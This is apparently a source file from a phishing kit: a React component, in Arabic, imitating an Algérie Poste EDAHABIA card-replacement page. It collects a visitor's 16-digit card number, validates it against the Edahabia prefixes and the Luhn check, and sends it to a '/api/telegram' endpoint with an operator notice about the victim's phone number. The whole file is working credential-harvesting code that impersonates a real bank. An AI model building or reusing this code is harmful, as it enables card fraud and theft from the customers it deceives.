"use client"

import { useState } from "react"
import { CreditCard, Info, ClipboardPaste, RotateCcw, AlertCircle, Bell } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { validateLuhn } from "@/lib/luhn"

interface StepCardNumberProps {
  onNext: (cardNumber: string) => void
  currentStep: number
  cardName?: string
}

export function StepCardNumber({ onNext, currentStep, cardName }: StepCardNumberProps) {
  const [cardNumber, setCardNumber] = useState("")
  const [showError, setShowError] = useState(false)
  const [notificationSent, setNotificationSent] = useState(false)

  const formatCardNumber = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 16)
    // Format as 6-2-8: first 6 digits, then 2 digits, then 8 digits
    return numbers.replace(/(\d{6})(\d{2})(\d{1,8})/, "$1 $2 $3").trim()
  }

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value)
    setCardNumber(formatted)
    setShowError(false)
  }

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText()
      const formatted = formatCardNumber(text)
      setCardNumber(formatted)
      setShowError(false)
    } catch (err) {
      console.log("Failed to paste")
    }
  }

  const rawNumber = cardNumber.replace(/\s/g, "")
  const isValidPrefix = rawNumber.startsWith("62807030") || rawNumber.startsWith("62807031")
  const isValidCardNumber = rawNumber.length === 16 && isValidPrefix && validateLuhn(rawNumber)

  const handleNext = () => {
    if (!isValidCardNumber) {
      setShowError(true)
      return
    }
    onNext(rawNumber)
  }

  const handleSendNotification = async () => {
    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: `رقم الهاتف المدخل خاطئ او غير مرتبط بالبطاقة الذهبية\nرقم البطاقة: ${rawNumber}`
        })
      })
      if (response.ok) {
        setNotificationSent(true)
        setTimeout(() => setNotificationSent(false), 3000)
      }
    } catch (error) {
      console.error("[v0] Error sending notification:", error)
    }
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Progress Steps */}
      <div className="flex items-center justify-center gap-2 py-6">
        <div className="flex items-center">
          <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center text-sm font-medium">
            3
          </div>
          <div className="w-12 h-0.5 bg-muted"></div>
        </div>
        <div className="flex items-center">
          <div className="w-8 h-8 rounded-full bg-muted text-muted-foreground flex items-center justify-center text-sm font-medium">
            2
          </div>
          <div className="w-12 h-0.5 bg-muted"></div>
        </div>
        <div className="w-10 h-10 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-sm font-bold">
          1
        </div>
      </div>

      {/* Title */}
      <div className="text-center px-4 mb-6">
        <h1 className="text-2xl font-bold text-foreground mb-2">
          🆕 اختيار بطاقة جديدة
        </h1>
        <h2 className="text-xl font-bold text-foreground mb-3 flex items-center justify-center gap-2">
          <span>📇 البطاقة:</span>
          <span className="text-primary">{cardName || "البطاقة"}</span>
        </h2>
        <p className="text-muted-foreground text-sm">
          أدخل الأرقام الـ16 الموجودة في وجه بطاقتك للبدء في عملية الاستبدال
        </p>
      </div>

      {/* Golden Card Visual */}
      <div className="mx-4 mb-6">
        <div className="bg-gradient-to-br from-[#d4a854] via-[#c9a227] to-[#b8960f] rounded-2xl p-6 shadow-xl">
          <div className="flex justify-between items-start mb-8">
            <span className="text-xs font-semibold text-black/70 tracking-wider">ALGERIE POSTE</span>
            <span className="text-xs font-semibold text-black/70 tracking-wider">EDAHABIA</span>
          </div>
          
          {/* Chip */}
          <div className="w-12 h-9 bg-gradient-to-br from-yellow-200 to-yellow-400 rounded-md mb-6 flex items-center justify-center">
            <div className="w-8 h-6 border border-yellow-600/30 rounded-sm"></div>
          </div>

          {/* Card Number Display */}
          <div className="flex justify-between mb-6 font-mono text-lg text-black/80 tracking-widest">
            <span>{cardNumber ? cardNumber.slice(0, 6) : "••••••"}</span>
            <span>{cardNumber ? cardNumber.slice(7, 9) : "••"}</span>
            <span>{cardNumber ? cardNumber.slice(10, 18) : "••••••••"}</span>
          </div>

          <div className="flex justify-between items-end">
            <div>
              <p className="text-[10px] text-black/50 mb-1">CARD HOLDER</p>
              <p className="text-sm font-semibold text-black/80">NOM PRENOM</p>
            </div>
            <div className="text-left">
              <p className="text-[10px] text-black/50 mb-1">VALID THRU</p>
              <p className="text-sm font-semibold text-black/80">MM/AA</p>
            </div>
          </div>
        </div>
      </div>

      {/* Info Note */}
      <div className="flex items-center justify-center gap-2 text-muted-foreground text-sm mb-6 px-4">
        <Info className="w-4 h-4" />
        <span>الأرقام تظهر هنا أثناء الكتابة لتأكيد المطابقة</span>
      </div>

      {/* Input Section */}
      <div className="bg-secondary/50 rounded-t-3xl p-6 mx-2">
        <div className="flex items-center justify-between mb-3">
          <Button
            onClick={handleSendNotification}
            variant="ghost"
            size="sm"
            className="h-auto p-1 hover:bg-transparent hover:text-primary"
            disabled={notificationSent}
          >
            <Bell className="w-5 h-5" />
          </Button>
          <div className="flex items-center justify-end gap-2">
            <span className="text-foreground font-medium">💳 رقم البطاقة:</span>
            <CreditCard className="w-5 h-5 text-primary" />
          </div>
        </div>

        {notificationSent && (
          <div className="text-xs text-success mb-2 text-center">
            تم إرسال الإشعار بنجاح
          </div>
        )}

        <div className="relative mb-2">
          <Input
            type="text"
            value={cardNumber}
            onChange={handleChange}
            placeholder="628070 30 00000000"
            className="bg-background border-border text-foreground text-xl font-mono tracking-wider h-14 text-right pr-4 pl-16"
            dir="ltr"
          />
          <button
            onClick={handlePaste}
            className="absolute left-3 top-1/2 -translate-y-1/2 text-primary font-medium flex items-center gap-1"
          >
            <ClipboardPaste className="w-4 h-4" />
            لصق
          </button>
        </div>

        <div className="flex justify-between text-sm text-muted-foreground mb-6">
          <span>{rawNumber.length}/16</span>
          <span>يجب أن يبدأ بـ 62807030 أو 62807031</span>
        </div>

        {showError && (
          <div className="flex items-center gap-2 bg-destructive/10 border border-destructive/20 rounded-lg p-3 mb-4">
            <AlertCircle className="w-4 h-4 text-destructive flex-shrink-0" />
            <div className="text-sm text-destructive">
              <p className="font-semibold">رقم البطاقة غير صحيح</p>
              <p className="text-xs">
                {rawNumber.length < 16
                  ? "أكمل إدخال الأرقام الـ16"
                  : !isValidPrefix
                  ? "البطاقة يجب أن تبدأ بـ 62807030 أو 62807031 فقط"
                  : "رقم البطاقة لا يطابق خوارزمية Luhn. تحقق من الأرقام وحاول مجددًا"}
              </p>
            </div>
          </div>
        )}

        {!showError && rawNumber.length === 16 && isValidCardNumber && (
          <div className="flex items-center gap-2 bg-success/10 border border-success/20 rounded-lg p-3 mb-4">
            <span className="text-sm text-success font-semibold">✓ رقم البطاقة صحيح</span>
          </div>
        )}

        <div className="flex gap-3">
          <Button
            onClick={handleNext}
            disabled={rawNumber.length !== 16 || !isValidCardNumber}
            className="flex-1 h-14 bg-primary hover:bg-primary/90 text-primary-foreground text-lg font-bold rounded-xl"
          >
            <RotateCcw className="w-5 h-5 ml-2" />
            متابعة الاستبدال
          </Button>
          
          <Button
            onClick={handleSendNotification}
            variant="outline"
            size="lg"
            className="h-14 px-4 rounded-xl"
            title="إرسال إشعار بخصوص رقم الهاتف"
            disabled={notificationSent}
          >
            {notificationSent ? (
              <span className="text-sm">✓ تم الإرسال</span>
            ) : (
              <>
                <Bell className="w-5 h-5" />
              </>
            )}
          </Button>
        </div>
      </div>
    </div>
  )
}
